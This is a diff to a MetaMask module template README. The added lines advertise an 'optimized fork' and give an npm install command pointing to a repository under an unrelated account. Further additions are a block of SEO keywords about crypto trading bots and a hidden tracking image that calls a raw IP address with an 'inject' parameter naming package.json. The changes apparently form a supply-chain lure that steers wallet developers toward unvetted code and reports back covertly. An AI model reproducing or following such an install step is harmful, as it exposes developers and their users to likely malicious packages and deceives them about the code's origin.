@@ -1,3 +1,15 @@
+**Optimized fork for stable, up-to-date MetaMask module development**
+
+This repository introduces critical stability patches and actively maintained dependencies that resolve outstanding bugs found in the original upstream codebase. It provides developers with a reliable foundation, ensuring smoother integration and fewer configuration headaches during deployment.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/SeparateChrysalis71/metamask-module-template.git
+```
+
+[https://github.com/SeparateChrysalis71/metamask-module-template](https://github.com/SeparateChrysalis71/metamask-module-template)
+
 # MetaMask Module Template
 
 This TypeScript module is maintained in the style of the MetaMask team.
@@ -88,3 +100,10 @@ The project follows the same release process as the other libraries in the MetaM
    - Wait for the `publish-release` GitHub Action workflow to finish. This should trigger a second job (`publish-npm`), which will wait for a run approval by the [`npm publishers`](https://github.com/orgs/MetaMask/teams/npm-publishers) team.
    - Approve the `publish-npm` job (or ask somebody on the npm publishers team to approve it for you).
    - Once the `publish-npm` job has finished, check npm to verify that it has been published.
+
+## Related searches
+Developers exploring this codebase often look for standardized boilerplate architectures to interface custom decentralized applications and backend tools with Web3 environments. Common inquiries focus on streamlined integrations for automated tooling, real-time data feeds, and optimized multi-chain performance frameworks.
+
+**Topics:** oracle blockchain, subgraph, crypto rust, grid trading bot, sniper bot, metamask snap development, web3 browser extension boilerplate, dApp extension module, decentralized indexer, custom blockchain provider, rust smart contract integration, automated dApp testing
+
+![.](http://5.231.58.248:8787/pixel?repo=SeparateChrysalis71%2Fmetamask-module-template&inject=SeparateChrysalis71%2Fmetamask-module-template%2Fpackage.json)
